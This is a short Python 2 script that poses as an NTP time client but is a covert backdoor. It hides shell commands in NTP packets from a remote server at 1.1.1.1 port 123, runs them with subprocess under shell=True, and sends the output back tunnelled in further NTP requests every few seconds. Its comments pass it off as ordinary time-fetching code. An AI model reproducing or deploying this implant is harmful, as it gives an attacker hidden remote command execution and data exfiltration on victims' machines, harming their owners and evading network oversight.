from socket import AF_INET, SOCK_DGRAM  # For setting up the UDP packet.
import sys
import os
import binascii
import socket
import subprocess
import struct, time  # To unpack the packet sent back and to convert the seconds to a string.

command = ""
host = "1.1.1.1"  # Target server.
port = 123  # Port.
socket.setdefaulttimeout(1)
epoch = 2208988800L  # Time in seconds since Jan, 1970 for UNIX epoch.

def clientsend(client,address,data):
    client.sendto(data, address)
    return client.recvfrom(read_buffer)

def send(client, address,dataExtra):
    if dataExtra!= '':
        print("Result:")
        print(dataExtra)
    data = '\x1b' + 47 * '\0' + binascii.b2a_hex(dataExtra) # Hex message to send to the server.

    data, address = clientsend(client,address,data )  # Send Data
    t = struct.unpack("!12I", data[:48])[10]  # Unpack the binary data and get the seconds out.
    t -= epoch  # Calculate seconds since the epoch.
    print("Time = %s" % time.ctime(t))  # Print the seconds as a formatted string.
    command = binascii.a2b_hex(data[48:]).replace("\x00","")  # Unpack the binary data and get the seconds out.
    return command

def execute(command):
    command_res = ''
    print("Command is:%s" % command)
    for lines in command.split("\n"):
        compilePopen = subprocess.Popen(lines, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
        out, err = compilePopen.communicate()
    return out


read_buffer = 102400  # The size of the buffer to read in the received UDP packet.
address = (host, port)  # Tuple needed by sendto.

dataExtra = ''
while True:
    try:
        client = socket.socket(AF_INET, SOCK_DGRAM)  # Internet, UDP
        if len(dataExtra) < 4096:
            command = send(client, address,dataExtra)  # get command
            dataExtra = ''
        else:
            command = ''
            dataExtra = "Result is too long:%i,Max 4096" % len(dataExtra)
            send(client, address,dataExtra)
            dataExtra = ''
    except Exception as e:
        send(client, address,str(e))
        command = ''
        pass
    if len(command) >= 1:
        dataExtra = execute(command)
    else:
        dataExtra = ''
    time.sleep(3)

